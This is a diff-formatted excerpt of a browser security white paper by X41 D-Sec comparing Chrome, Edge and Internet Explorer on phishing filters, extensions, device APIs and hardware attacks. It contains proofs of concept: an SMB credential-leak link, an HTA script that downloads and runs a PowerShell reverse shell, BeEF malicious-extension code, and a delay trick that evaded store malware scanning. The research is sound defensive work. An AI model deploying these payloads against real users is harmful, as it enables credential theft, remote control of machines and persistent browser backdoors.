-
-
-
 
  1   file_types {
  2     extension: "scf"
@@ -5247,10 +4230,7 @@ b?q=asciipb+package:%5Echromium$&l=1
  9     }
 10   }
 
-
-
                                     Listing 12.2: Blacklisting of SCF in SafeBrowsing
-
 
      The SCF issue shows that there may be undetected security risks in some file types that are considered safe,
      which makes automatic downloads a potential attack vector. In order to detect wide-scale attacks using this
@@ -5258,8 +4238,6 @@ b?q=asciipb+package:%5Echromium$&l=1
      specific file-type, the SafeBrowsing team should notice a sudden increase in downloads for that file-type.
      The SafeBrowsing team can mitigate this attack by updating the list of malicious file extensions, which
      could potentially be done within a few hours.
-
-
 
      12.1.2        Credential Leakage Via HTML Resources
 
@@ -5285,18 +4263,11 @@ b?q=asciipb+package:%5Echromium$&l=1
         4 https://github.com/lgandx/Responder
         5 https://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/
 
-
-
-
      X41 D-SEC GmbH                                                                                   Page 108 of 197
     Browser Security White Paper
 
-
-
-
     Figure 12.2: The only user interaction needed is moving the mouse anywhere on the page, which is unavoidable once
     the browser has navigated to the attack page.
-
 
     Note that the PoC code uses a private IP, however the attacks works reliably using a remote SMB server as
     far as the target does not perform egress filtering of SMB ports like 445.
@@ -5320,24 +4291,15 @@ b?q=asciipb+package:%5Echromium$&l=1
 3   <a id=6 href="\\10.0.61.72\edgeleak" download>tryme</a>
 4   </body>
 
-
-
                                        Listing 12.3: PoC for SMB Credential Leak
-
 
     The default behavior can be changed using the Microsoft Windows registry settings. By setting the registry
     key ClientAllowedNTLMServers in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\MSV1_0\
 
-
     X41 D-SEC GmbH                                                                                      Page 109 of 197
     Browser Security White Paper
 
-
-
-
     the insecure behavior can be mitigated.
-
-
 
     12.1.3       Dangerous Legacy Functionality
 
@@ -5357,7 +4319,6 @@ b?q=asciipb+package:%5Echromium$&l=1
     supported from Internet Explorer version 5.5. to 11, and also in Microsoft Edge7 , it is easy to obtain reverse
     shells via a file-less PowerShell payload which is triggered with the following code shown in listing 12.4.
 
-
 1   <script>
 2     var c = "cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c
 3       \"\"IEX ((new-object net.webclient).downloadstring('http://10.0.61.75:3000/ps/ps.png'));
@@ -5365,10 +4326,7 @@ b?q=asciipb+package:%5Echromium$&l=1
 5     new ActiveXObject('WScript.Shell').Run(c);
 6   </script>
 
-
-
                                    Listing 12.4: Reverse Shell via PowerShell Payload
-
 
     The user needs to Open or Save the HTA, then Allow the execution, as shown in the following screenshots. The
     interesting point here is that the publisher of the HTA file looks like Microsoft (see figures 12.3 and 12.4).
@@ -5384,22 +4342,12 @@ b?q=asciipb+package:%5Echromium$&l=1
       7 https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-i
     nternet-exploreredge/
 
-
-
-
     X41 D-SEC GmbH                                                                                     Page 110 of 197
 Browser Security White Paper
 
-
-
-
                  Figure 12.3: First user interaction required when serving the HTA from an http(s) origin
 
-
-
-
                                Figure 12.4: Second user interaction required after running the HTA
-
 
 To mitigate attacks that rely on HTAs, it is possible to use software restriction policies8 , for instance by
 changing the default program associated to the file extension .hta to be notepad.exe (instead of mshta.exe)9 .
@@ -5408,8 +4356,6 @@ In conclusion, we consider Internet Explorer to be most vulnerable to client-sid
 possibility to open web-pages in Internet Explorer (see 6.1.2) with minimal user-interaction in the default
 install, as well as closer coupling to possibly dangerous OS functions, make Microsoft Edge more vulnerable
 to client-side attack vectors than Google Chrome.
-
-
 
 12.2        PHISHING
 
@@ -5423,14 +4369,8 @@ queries before navigation to a URL is performed. However, it is easy for an atta
   9 https://bluesoul.me/2016/05/12/use-gpo-to-change-the-default-behavior-of-potentially-malicious-file-e
 xtensions/
 
-
-
-
 X41 D-SEC GmbH                                                                                              Page 111 of 197
 Browser Security White Paper
-
-
-
 
 a relatively anonymous way, buy Secure Sockets Layer (SSL) certificates for it, and deliver spear phishing
 campaigns that have a life-span of only a few days. This means the likelihood a spear phishing link (used
@@ -5443,11 +4383,9 @@ Edge to protect users from phishing domains: SafeBrowsing10 and SmartScreen11 .
 Two public sources of phishing domains were used to have a public feed of fresh data, not directly tied to
 any browser vendor:
 
-
     • PhishTank: 26258 URLs (feed from 1th July)
 
     • OpenPhish: 3663 URLs (feed from 30th June)
-
 
 The details of the analysis are given in the following two tables. The table 12.1 shows how many domains
 were missed, while the second table 12.2 shows the results of the intersection tests checking which domains
@@ -5470,24 +4408,15 @@ stop working, which would make it harder to confirm the more time has past since
 
                                Table 12.1: Statistics of phishing sites missed and manually verified
 
-
-
 Additionally, a few days after performing the main analysis, the 6th of July, additional tests were performed.
 The domains allowed by SmartScreen were processed with SafeBrowsing, and vice versa.
  10 https://safebrowsing.google.com
  11 https://blogs.windows.com/msedgedev/2015/12/16/smartscreen-drive-by-improvements/#5G6oHeBdLlufW4kb.97
 
-
-
-
 X41 D-SEC GmbH                                                                                            Page 112 of 197
 Browser Security White Paper
 
-
-
-
                                Figure 12.5: Example of sites not counted in the final statistics
-
 
 The results are shown in the following table:
 
@@ -5496,7 +4425,6 @@ The results are shown in the following table:
               Google Chrome          PhishTank       6246                             3252 (52%)
               Google Chrome          OpenPhish       390                              295 (75.6%)
 
-
               Browser                Source          Total Missed (by Chrome)         Blocked (by Edge)
 
               Microsoft Edge         PhishTank       4555                             2177 (47.8%)
@@ -5504,26 +4432,14 @@ The results are shown in the following table:
 
                                             Table 12.2: Intersection tests results
 
-
-
 Overall Google Chrome performs better in all tests, blocking more phishing domains than Microsoft Edge.
-
-
-
 
 X41 D-SEC GmbH                                                                                            Page 113 of 197
 Browser Security White Paper
 
-
-
-
                                Figure 12.6: Intersection of OpenPhish missed sites
 
-
-
-
                                Figure 12.7: Intersection of PhishTank missed sites
-
 
 The Venn diagrams displayed in figures 12.6 and 12.7 show the intersection of sites from OpenPhish and
 PhishTank that were missed by both SafeBrowsing and SmartScreen.
@@ -5538,14 +4454,8 @@ security perspective.
 
 In order to get around this problem for Google Chrome, an extension was written for the task.
 
-
-
-
 X41 D-SEC GmbH                                                                                  Page 114 of 197
 Browser Security White Paper
-
-
-
 
 12.2.1       Google Safe Browsing
 
@@ -5562,19 +4472,10 @@ tab status switches from loading to complete this information can be used to sta
 was not blocked by SafeBrowsing. The code used for Google Chrome instrumentation can be found in the
 Appendix A.4.
 
-
-
-
                        Figure 12.8: SafeBrowsing testing via browser extension from multiple VMs
-
-
-
 
 X41 D-SEC GmbH                                                                                     Page 115 of 197
 Browser Security White Paper
-
-
-
 
 12.2.2       Microsoft SmartScreen
 
@@ -5595,8 +4496,6 @@ The analysis of SmartScreen has been overall slower. Moreover, Microsoft should 
 SmartScreen as an API to those having a Microsoft account, as Google does with its SafeBrowsing technol-
 ogy. The code used for Microsoft Edge instrumentation can be found in the Appendix A.5.
 
-
-
 12.2.3       Phishing Protection
 
 A general recommendation that is commonly given when prompted about how phishing can be mitigated is
@@ -5612,7 +4511,6 @@ MITM can be prevented using TLS channel ids.
 While U2F could be a technical mitigation for phishing and MITM, the application support is quite limited
 at the moment. A partial list of well-known applications that do support U2F are listed below:
 
-
     • Google products, Youtube
 
     • Facebook
@@ -5623,21 +4521,12 @@ at the moment. A partial list of well-known applications that do support U2F are
   13 https://www.yubico.com/about/background/fido/
   14 https://developers.yubico.com/U2F/Protocol_details/Overview.html
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 116 of 197
 Browser Security White Paper
 
-
-
-
                                Figure 12.9: How U2F can prevent phishing and MITM
 
-
     • Dropbox
-
-
 
 12.3        BROWSER EXTENSIONS
 
@@ -5645,8 +4534,6 @@ Browser extensions are a convenient way of extending the browser functionality p
 a set of APIs. There are a number of extensions developed by the community which had great success,
 such as Firebug15 , AdBlock16 , HTTPSEverywhere17 . However, extensions are new code and may be given
 permissions that can negatively impact security, hence they are a potential new avenue of attacks.
-
-
 
 12.3.1       Google Chrome Extensions Manifest and Permissions
 
@@ -5663,14 +4550,8 @@ origin. The NPAPI has been deprecated from 2013, so it is not possible to direct
  16 https://chrome.google.com/webstore/detail/adblock/gighmmpiobklfepjocnamgkkbiglidom
  17 https://www.eff.org/https-everywhere
 
-
-
-
 X41 D-SEC GmbH                                                                                 Page 117 of 197
      Browser Security White Paper
-
-
-
 
      anymore. However, developers can still make their extension vulnerable to Remote Command Execution as
      Tavis Ormandy has proven against WebEx Extension for Google Chrome18 . For some reasons parts of the
@@ -5685,7 +4566,6 @@ X41 D-SEC GmbH                                                                  
 
      The following (see listing 12.5) is an example of a (malicious) Google Chrome extension manifest file version
      2, with a relaxed permission model and relaxed CSP policy, taken from the BeEF project19 .
-
 
  1   {
  2          "name": "Adobe Flash Player Plugin Update",
@@ -5710,10 +4590,7 @@ X41 D-SEC GmbH                                                                  
 20          ]
 21   }
 
-
-
                        Listing 12.5: Manifest for the Google Chrome malicious extension used later in this section
-
 
      Table 12.3 enumerates all the Google Chrome extension permissions available. Note that permissions that
      apply only to Chrome OS were not listed, meaning that the following permissions work on extensions on
@@ -5727,13 +4604,8 @@ X41 D-SEC GmbH                                                                  
          18 https://bugs.chromium.org/p/project-zero/issues/detail?id=1096
          19 https://beefproject.com/
 
-
-
      X41 D-SEC GmbH                                                                                                  Page 118 of 197
     Browser Security White Paper
-
-
-
 
         background                     the browser runs (invisibly) as soon as the user logs into their computer, in order to have extensions live longer.
         bookmarks                      enable calling the chrome.bookmarks API.
@@ -5781,9 +4653,6 @@ X41 D-SEC GmbH                                                                  
 
                                                 Table 12.3: Chrome Extensions Permissions
 
-
-
-
     12.3.2         Microsoft Edge Extensions Manifest and Permissions
 
     The following (see listing 12.6) is an example of a Microsoft Edge extension manifest file. You can see the
@@ -5792,16 +4661,11 @@ X41 D-SEC GmbH                                                                  
     also in Microsoft Edge extensions need to be served via a specific site, which in this case is Windows Store.
     Both browsers allow unsigned extension to be loaded from the filesystem in Developer mode.
 
-
 1   {
 2          "name" : "Sample extension manifest",
 
-
     X41 D-SEC GmbH                                                                                                                         Page 119 of 197
      Browser Security White Paper
-
-
-
 
  3        "version" : "1.0.0.0",
  4        "author" : "Microsoft Corporation",
@@ -5831,10 +4695,7 @@ X41 D-SEC GmbH                                                                  
 28        "minimum_edge_version" : "33.14281.1000.0",
 29   }
 
-
-
                        Listing 12.6: Example manifest of a Microsoft Edge extension with liberal permissions
-
 
      Table 12.4 lists the permissions available for Microsoft Edge extensions.
 
@@ -5854,24 +4715,16 @@ X41 D-SEC GmbH                                                                  
 
                                     Table 12.4: Overview of Microsoft Edge Extension Permissions
 
-
-
      It should be noted that at the time of writing this report it was possible to upload extensions on Windows
      Store only after contacting Microsoft, as reported in the following screenshot. Hence, tests on Microsoft
      Edge extensions were done using unsigned extensions locally developed and not uploaded to Windows
      Store (see figure 12.10).
 
-
-
      X41 D-SEC GmbH                                                                                                                     Page 120 of 197
 Browser Security White Paper
 
-
-
-
 Figure 12.10: Microsoft needs to be explicitly contacted before a Microsoft Edge extension can be uploaded to
 Windows Store
-
 
 Additionally, unsigned Microsoft Edge extensions are automatically turned off, after the browser is idle
 for ten seconds (see figure 12.11). Although this feature might be a hassle for extension developers, it
@@ -5879,12 +4732,7 @@ limits exposure to unsigned rogue extensions living in Microsoft Edge as the res
 persistence technique. Google Chrome instead alerts the user suggesting disabling the Developer mode
 since extensions might cause harm.
 
-
-
-
         Figure 12.11: Unsigned extensions are turned off automatically after 10-seconds of browser inactivity
-
-
 
 12.3.3       Internet Explorer Extensions
 
@@ -5902,7 +4750,6 @@ active on the tested Internet Explorer on Microsoft Windows 10 by default.
 Browser extensions in Internet Explorer run in Low Integrity mode, and then only read/write file system
 access is in the following directories:
 
-
     • USERPROFILE\Settings\Temporary Internet Files\Low
 
     • USERPROFILE\Local Settings\Temp\Low
@@ -5911,26 +4758,18 @@ access is in the following directories:
 
     • USERPROFILE\Cookies\Low
 
-
 X41 D-SEC GmbH                                                                                         Page 121 of 197
     Browser Security White Paper
-
-
-
 
         • USERPROFILE\Favorites\Low
 
         • USERPROFILE\History\Low
 
-
     However, Microsoft does not force users to write extensions in managed code (.NET), so many of them are
     written in C++, which makes the BHO code vulnerable to buffer and integer overflows, format string bugs
     and typical memory safety issues.
 
-
-
     12.3.3.1     Comparison of Extension Handling
-
 
     No browser in scope offered a way to reduce extension privileges by selectively revoking or giving per-
     missions. X41 D-Sec GmbH advises to implement a permission manager to set permission settings per
@@ -5942,8 +4781,6 @@ X41 D-SEC GmbH                                                                  
     Chrome. However, it was observable that Microsoft considers extensions as being dangerous in terms
     of security and implemented additional security restrictions such as the 10-second background limit and
     manual verification of extensions uploaded to the store.
-
-
 
     12.3.4       Native Messaging
 
@@ -5959,7 +4796,6 @@ X41 D-SEC GmbH                                                                  
     in Microsoft Edge this must be determined and enforced at runtime, via a lookup of the Package Family
     Name of the native application.
 
-
 1   // Chrome
 2   {
 3      "name": "chromeNativeApp",
@@ -5968,14 +4804,8 @@ X41 D-SEC GmbH                                                                  
      20 https://developer.chrome.com/extensions/messaging
      21 https://docs.microsoft.com/en-us/microsoft-edge/extensions/guides/native-messaging
 
-
-
-
     X41 D-SEC GmbH                                                                                Page 122 of 197
      Browser Security White Paper
-
-
-
 
  5        "path": "C:\\ProgramFiles\\nativeApp\\native_messaging_host.exe",
  6        "type": "stdio",
@@ -5997,17 +4827,12 @@ X41 D-SEC GmbH                                                                  
 21       </Application>
 22   </Applications>
 
-
-
                                      Listing 12.7: Declaring a Native Application Manifest
-
 
      It is safer to force the origin whitelisting in a configuration file, rather than relying on the developers to
      enforce it in their own code. However, an attack model where a Microsoft Edge extension is abused in order
      to connect to a different native application is mitigated by the fact that both the extension and the UWP
      application are packaged together.
-
-
 
      12.3.5       Security Considerations
 
@@ -6019,11 +4844,9 @@ X41 D-SEC GmbH                                                                  
 
      According to Google23 :
 
-
              Apps go through an automated review process and in most cases, an app will be published
              without further manual review. There may be some instances in which a manual review will be
              required before the app is published based on our program policies.
-
 
      An attacker who wants to do harm just needs the <all_urls> and tabs permissions to already achieve the
      equivalent of UXSS injecting remote scripts in any tabs. Other permissions can be abused as well, such as
@@ -6031,13 +4854,8 @@ X41 D-SEC GmbH                                                                  
      s
          23 https://developer.chrome.com/webstore/faq
 
-
-
      X41 D-SEC GmbH                                                                                   Page 123 of 197
      Browser Security White Paper
-
-
-
 
      geolocation and background which combined would not prompt the user when geolocation is needed as well
      as making the extension persistent even after the main browser window is closed or the user reboots.
@@ -6047,7 +4865,6 @@ X41 D-SEC GmbH                                                                  
      JavaScript hook file loaded via the background script can be just injected in all the open tabs. This can
      be achieved using the standard extension API, as demonstrated by the code in listing 12.8 from the BeEF
      project.
-
 
  1   var beefHookUri = beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port + beef.net.hook;
  2
@@ -6073,10 +4890,7 @@ X41 D-SEC GmbH                                                                  
 20         }
 21   });
 
-
-
                                     Listing 12.8: BeEF Fake Flash Update Chrome extension
-
 
      As expected this works reliably also on Google domains as shown in figure 12.12, and is a good example
      of a stealthy way to have a browser backdoor, which can become an open HTTP proxy, or just a powerful
@@ -6093,14 +4907,8 @@ X41 D-SEC GmbH                                                                  
       24 https://blog.malwarebytes.com/threat-analysis/2017/02/rogue-chrome-extension-pushes-tech-support-scam
       25 https://blog.malwarebytes.com/threat-analysis/2016/01/rogue-google-chrome-extension-spies-on-you
 
-
-
-
      X41 D-SEC GmbH                                                                                    Page 124 of 197
     Browser Security White Paper
-
-
-
 
     Malicious extensions activity can be mitigated via Enterprise group policies, since Google Chrome supports
     extension whitelists and blacklists as discussed in chapter 6 (Enterprise Features). Moreover, Google
@@ -6109,18 +4917,13 @@ X41 D-SEC GmbH                                                                  
     section 12.2 (Phishing). If an extension is deemed malicious by this blacklist, it will be disabled automatically
     to create no more harm, but it will not be removed from the filesystem.
 
-
-
-
        Figure 12.12: Demonstrating how a malicious extension can control arbitrary origins including Google domains
-
 
     The Google WebStore implements a number of automated security checks via extension instrumentation.
     This was practically tested uploading a malicious extension to the web store, making sure the extension
     was not publicly available but restricted to a few testing users via Group Policy26 .
 
     The first testbed consisted of an extension with the permissions shown in listing 12.9.
-
 
 1   "permissions": [
 2       "background",
@@ -6131,44 +4934,28 @@ X41 D-SEC GmbH                                                                  
 7       "cookies"
 8   ]
 
-
-
                                    Listing 12.9: Manifest for Malicious Google Chrome extension
-
 
     The background.js file was simply including a remote semi-obfuscated and minified BeEF hook from the
     origin https://api.penitenziagite.club. In order to have the BeEF hook working, the CSP must be
     relaxed as shown in listing 12.10.
      26 https://support.google.com/chrome/a/answer/188453?hl=en
 
-
-
     X41 D-SEC GmbH                                                                                       Page 125 of 197
     Browser Security White Paper
-
-
-
 
 1     "content_security_policy":
 2        "script-src 'self' 'unsafe-eval' https://api.penitenziagite.club; object-src 'self'"
 
-
-
                                         Listing 12.10: CSP Relaxing for BeEF hook
-
 
     The extension was automatically rejected since it was marked as malicious. This was expected, since the
     sandbox that Google uses to analyze extensions was polling back to the BeEF server twice a second via
     XHR, as shown in figure 12.13.
 
-
-
-
             Figure 12.13: The Google sandbox that analyze extension for malicious behavior polling back to BeEF
 
-
     The automated email from the web store mentioned the following three points:
-
 
         • “All of the files and code are included in the item package.”
 
@@ -6176,7 +4963,6 @@ X41 D-SEC GmbH                                                                  
 
         • “Avoid requesting or executing remotely hosted code (including by referencing remote JavaScript
            files or executing code obtained by XHR requests).”
-
 
     In order to make the malicious extension bypass the automated security checks, the following changes
     were applied to the background.js file. The jQuery dependency that the BeEF hook uses was replaced with
@@ -6188,17 +4974,12 @@ X41 D-SEC GmbH                                                                  
     code do check for malicious activity that happens during a limited amount of time. They usually fail open
     when nothing malicious happens during the time-limited analysis. Hence, they can sometimes be fooled by
 
-
     X41 D-SEC GmbH                                                                                       Page 126 of 197
      Browser Security White Paper
-
-
-
 
      just having a payload doing random sleeps, or sleep for a long enough time. Extension publishing time is
      usually under the hour, so having a 30 minutes sleep was considered to be enough. The modified code is
      shown in listing 12.11.
-
 
  1   // BYe == BeEF
  2   if (!BYe.pageIsLoaded) {
@@ -6215,20 +4996,13 @@ X41 D-SEC GmbH                                                                  
 13       },fin);
 14   }
 
-
-
                                       Listing 12.11: Bypassing of Automated Security Checks
-
 
      Thanks to the setTimeout() delayed call, no connections from the Google extensions sandbox were received,
      confirming that automated security checks were bypassed. As expected, the extension was successfully
      uploaded and it was possible to install it, as shown in figure 12.14.
 
-
-
-
                            Figure 12.14: The malicious extension was published and ready to be installed
-
 
      Having proven that achieving a bypass of the automated security checks is possible does not mean that
      such checks are useless. They surely prevent and minimize the number of bad extensions available in
@@ -6245,19 +5019,12 @@ X41 D-SEC GmbH                                                                  
      Microsoft Edge extensions ecosystem is still under development. Only 35 extensions were available in the
      Microsoft Store when this report was written. The same considerations for Google Chrome extensions
 
-
      X41 D-SEC GmbH                                                                                        Page 127 of 197
 Browser Security White Paper
-
-
-
 
 apply here. However, the need to contact Microsoft in advance to publish an extension, and the support for
 more permissions still ongoing, certainly makes it more attractive for an attacker to abuse Google Chrome
 extensions rather than Microsoft Edge ones.
-
-
-
 
 X41 D-SEC GmbH                                                                                Page 128 of 197
 13           Peripheral Device Access
@@ -6277,11 +5044,7 @@ They are supported by different browsers as shown in table 13.1.
               Table 13.1: Comparison of Peripheral Device Support ( - True, # - False, G
                                                                                        # - Partly)
 
-
-
 A more detailed description will be given in the following sections.
-
-
 
 13.1      WEBUSB
 
@@ -6299,14 +5062,8 @@ has to be enabled in Google Chrome to make the WebUSB API available to websites.
   3 https://www.w3.org/community/wicg/
   4 https://developer.chrome.com/apps/usb
 
-
-
-
                                                       129
 Browser Security White Paper
-
-
-
 
 WebUSB is currently not supported on Microsoft Edge or Internet Explorer and not listed on the platform
 status page5 of Microsoft Edge. X41 D-Sec GmbH assumes that no implementation is currently planned.
@@ -6318,13 +5075,11 @@ article6 on the Chromium Dev Channel.
 
 The security model of the web is also applied to WebUSB as stated in the article:
 
-
     • “The web is ephemeral. If you’re only borrowing the device or decide to return it, there is nothing left
        on your system to hunt down and remove.”
 
     • “Sites run in their own sandboxes. Even if a site is malicious or compromised it can not access other
        sites or devices that the user has not given it access to. If the site crashes you can just reload it.”
-
 
 The third item in this list, where websites need to be whitelisted, was removed7 for top-level frames. For
 embedded frames USB access is disallowed unless there is a Feature Policy available8 .
@@ -6354,17 +5109,10 @@ an XSS vulnerability in a trusted site, or a UXSS vulnerability in Chrome.
    7 https://codereview.chromium.org/2611773004/
    8 https://codereview.chromium.org/2815003005/
 
-
-
-
 X41 D-SEC GmbH                                                                                        Page 130 of 197
 Browser Security White Paper
 
-
-
-
                                     Figure 13.1: UI Confusion with WebUSB
-
 
 One example of a logic bug in the permission system was identified by X41 D-Sec GmbH during this research.
 As shown in figure 13.1, it was possible to force the browser to show the permissions dialogue for domain
@@ -6373,7 +5121,6 @@ details are given in the bug report9 . This issue has been fixed in recent versi
 to Google.
 
 Access to USB devices introduces unique security considerations, such as:
-
 
     • The security of USB devices depends entirely on the efforts of the vendor/manufacturer rather
        than the browser vendors. The security of Internet-of-Things devices suggests that vendors and
@@ -6390,14 +5137,8 @@ Access to USB devices introduces unique security considerations, such as:
     • Compromised USB devices can potentially attack the kernel driver, which may offer a large attack
    9 https://bugs.chromium.org/p/chromium/issues/detail?id=723503
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 131 of 197
 Browser Security White Paper
-
-
-
 
        service to the device and put too much trust in its integrity. This could potentially be used to elevate
        privileges on the system as well.
@@ -6409,7 +5150,6 @@ Browser Security White Paper
 
     • Users may not be aware that a simple USB device that normally offers very little or no access to the
        system might still allow an attacker full access to the system once compromised.
-
 
 The Chromium team considered10 the possibility of malicious firmware updates and suggested some ways
 to mitigate their risk. X41 D-Sec GmbH considers this as an area where we are likely to see vulnerabilities,
@@ -6426,14 +5166,11 @@ to compromise those resources. It is recommended to use group policies as descri
 whitelist devices that may be exposed to web origins in Google Chrome. By default there is no restriction
 on which devices can be exposed by the user’s choice.
 
-
-
 13.2        WEB BLUETOOTH
 
 The Web Bluetooth API allows connecting and interacting with devices over the Bluetooth 4 wireless
 standard11 . The draft for this standard describes security considerations that are also discussed in a blog
 post12 by Jeffrey Yasskin (Google Chrome Software Engineer):
-
 
     • Access and control over devices that have intended features which might impact the privacy and
        security of users.
@@ -6446,14 +5183,8 @@ post12 by Jeffrey Yasskin (Google Chrome Software Engineer):
  11 https://webbluetoothcg.github.io/web-bluetooth/
  12 https://medium.com/@jyasskin/the-web-bluetooth-security-model-666b4e7eed2
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 132 of 197
 Browser Security White Paper
-
-
-
 
 The permission model and access control is similar to WebUSB as described in section 13.1. The general
 security considerations of WebUSB apply to WebBluetooth as well. Access to services of a specific Bluetooth
@@ -6463,8 +5194,6 @@ is allowed access to any service that was listed in the filters13 part of the pe
 Currently Web Bluetooth is available in Google Chrome but must be manually enabled using the “chrome://-
 flags/#enable-experimental-web-platform-features” flag. It is under consideration (with low priority) in
 Microsoft Edge14 .
-
-
 
 13.2.1       Attacks on Devices
 
@@ -6486,8 +5215,6 @@ exist in the website, extensions or the browser itself, as these would allow a m
 device by injecting code into an origin that has been granted such access. Also, bugs in the permissions UI
 of a web browser might be used to mislead users into giving permissions to malicious websites.
 
-
-
 13.2.2       Malicious Bluetooth Devices
 
 An attacker might try to get a user to use a malicious Bluetooth device with a sensitive website. Once
@@ -6500,14 +5227,8 @@ may open up an attack vector for XSS vulnerabilities in that website. Also, any 
  13 https://webbluetoothcg.github.io/web-bluetooth/#dom-requestdeviceoptions-filters
  14 https://developer.microsoft.com/en-us/microsoft-edge/platform/status/webbluetooth/
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 133 of 197
 Browser Security White Paper
-
-
-
 
 by the website to the malicious Bluetooth device may be leaked to the attacker that controls the device.
 Depending on how a device is used by a website, there may be many other potential attack vectors.
@@ -6515,8 +5236,6 @@ Depending on how a device is used by a website, there may be many other potentia
 A website looking to interact with a Bluetooth device should therefore consider the possibility that that
 device it connects might be compromised and should attempt to prevent or detect this and limit the impact
 of malicious devices.
-
-
 
 13.2.3       Comparison
 
@@ -6536,9 +5255,6 @@ by security researchers.
 In conclusion, we consider Microsoft Edge and Internet Explorer to have a smaller attack surface than
 Google Chrome by default regarding peripheral device access.
 
-
-
-
 X41 D-SEC GmbH                                                                                  Page 134 of 197
 14             Attacks Using Hardware Defects
 
@@ -6550,8 +5266,6 @@ The faults and attacks described here are hardware problems and not implementati
 consider browsers as one of several relevant attack vectors that can be used to conduct such attacks. They
 include virtual machines such as the JavaScript Engine, which provide attackers with powerful primitives
 that may allow attacks against hardware.
-
-
 
 14.1        ROWHAMMER AND FAULT ATTACKS
 
@@ -6576,14 +5290,8 @@ df
      4 https://www.google.com/patents/US20140006703
      5 https://googleprojectzero.blogspot.de/2015/03/exploiting-dram-rowhammer-bug-to-gain.html
 
-
-
-
                                                       135
     Browser Security White Paper
-
-
-
 
     could be used to reliably escalate privileges in real systems. The most interesting thing about this attack is
     that hardware based faults are being exploited purely from software in order to attack other parts of the
@@ -6592,7 +5300,6 @@ df
     Tiny code snippets can cause such a bit-flip, as seen in the code (see listing 14.1) taken from the Project
     Zero blogpost6 :
 
-
 1   code1a:
 2     mov (X), %eax // Read from address X
 3     mov (Y), %ebx // Read from address Y
@@ -6600,10 +5307,7 @@ df
 5     clflush (Y) // Flush cache for address Y
 6     jmp code1a
 
-
-
                                                Listing 14.1: rowhammer PoC
-
 
     Note that caching can get in the way of a Rowhammer attack by preventing the physical DRAM chip from
     being accessed, so in the example code the cache is flushed using clflush instructions.
@@ -6615,8 +5319,6 @@ df
     accompanying proof-of-concept8 called “Rowhammer.js: A Remote Software-Induced Fault Attack in JavaScript”
     by D. Gruss, C. Maurice, and S. Mangard showed that it is practically possible to exploit a Rowhammer issue
     using JavaScript in a web browser.
-
-
 
     14.1.1       State of Rowhammer Mitigations in Different Browsers
 
@@ -6635,13 +5337,8 @@ df
        8 https://github.com/IAIK/rowhammerjs
        9 https://lwn.net/Articles/704920/
 
-
-
     X41 D-SEC GmbH                                                                                   Page 136 of 197
 Browser Security White Paper
-
-
-
 
 level, by introducing error detection or memory row activation counting and blocking accesses after a
 certain threshold is reached. Research10 shows that simple Error Correcting Code (ECC) memory can only
@@ -6655,8 +5352,6 @@ Such mitigations could include randomization and runtime integrity checking of i
 The former would make exploitation less reliable while the latter could detect attacks and faults more
 easily. While such mitigations are probably easiest to implement on a kernel or hardware level, we believe
 they should be implemented on all levels.
-
-
 
 14.2        HIGH RESOLUTION TIMERS
 
@@ -6682,21 +5377,13 @@ and tested them independently. The results are given in table 14.1.
              setImmediate           N/A                    0.075ms                  0.065ms
              Shared Array Buffers   0.000003ms (3ns)       0.000003ms (3ns)         N/A
 
-
                                Table 14.1: Timer Resolution in Different Browsers
-
 
  10 https://users.ece.cmu.edu/~omutlu/pub/dram-row-hammer_kim_talk_isca14.pdf
  11 https://gruss.cc/files/fantastictimers.pdf
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 137 of 197
 Browser Security White Paper
-
-
-
 
 There are many more ways to measure time in JavaScript, including the newer asynchronous functionality
 and web workers, which provide asynchronous computation in separate threads and shared data. As seen
@@ -6713,9 +5400,6 @@ timers are a necessary precondition of timing attacks and available in Google Ch
 where Shared Array Buffers are available. The reliability and performance (speed) of such an attack depend
 highly on the environment and target of the attack.
 
-
-
-
 X41 D-SEC GmbH                                                                                Page 138 of 197
 15           Security Aspects Related to Usabil-
              ity
@@ -6729,8 +5413,6 @@ Over the previous chapters, specifically those about Browser Extensions and Phis
 of browser behaviors with bad usability where introduced, and they are brought back from a usability
 perspective in this chapter.
 
-
-
 15.1      GENERAL CONSIDERATIONS
 
 The main issue of security UIs in browsers is that they are usually built by technical people for technical
@@ -6738,31 +5420,19 @@ people. The average non-technical user base, which is the vast majority, can not
 or HTA prompts. The evolution of the mixed content dialogues starts from Internet Explorer 7, where the
 infamous prompt was as shown in figure 15.1.
 
-
-
-
                          Figure 15.1: The Mixed Content prompt in Internet Explorer 7
-
 
 It is quite clear that the user would click Yes, especially a non-technical one who just wants to see the whole
 page content regardless of the consequences of his actions. Things got better with the next versions, where
 the secure choice was the default one, together with more context about the consequences of the user
 
-
                                                      139
 Browser Security White Paper
-
-
-
 
 action. In the latest Internet Explorer and Microsoft Edge browsers the mixed content dialogue looks like
 in figure 15.2.
 
-
-
-
                            Figure 15.2: The Mixed Content prompt in latest Microsoft browsers
-
 
 Google Chrome has been blocking mixed content for many years, disabling by default the loading of insecure
 content while displaying a shield icon in the Omnibox browser bar. Users that want to enable insecure
@@ -6782,11 +5452,7 @@ presence of Microsoft in both the name and the publisher of the HTA, as well as 
 color which is not a direct indicator of something good or bad, make HTAs a perfect feature to be abused by
 attackers (see figure 15.3).
 
-
-
-
                                            Figure 15.3: HTA security prompt
-
 
 Microsoft Edge takes a more conservative approach, and both security and usability was improved a lot
 when compared to Internet Explorer. HTA are not supported anymore, which was a wise decision since the
@@ -6794,12 +5460,8 @@ consequence of a user being confused on the HTA security prompt results in arbit
 
 Attackers will always look at new browser features where security prompts are confusing, or not really
 
-
 X41 D-SEC GmbH                                                                                     Page 140 of 197
 Browser Security White Paper
-
-
-
 
 helping the user to make a safe choice, finding ways to abuse it. The way Microsoft approached the usability
 of Office macros is very similar to the HTA prompts. In case of macros, the attacker needs to convince
@@ -6816,11 +5478,7 @@ approach, although less usable, is to block camera and microphone access by defa
 origins that are allowed in a whitelist. Google Chrome allows such behavior, however it is not the default
 one, as seen in figure 15.4.
 
-
-
-
                                Figure 15.4: Camera and Microphone settings in Google Chrome
-
 
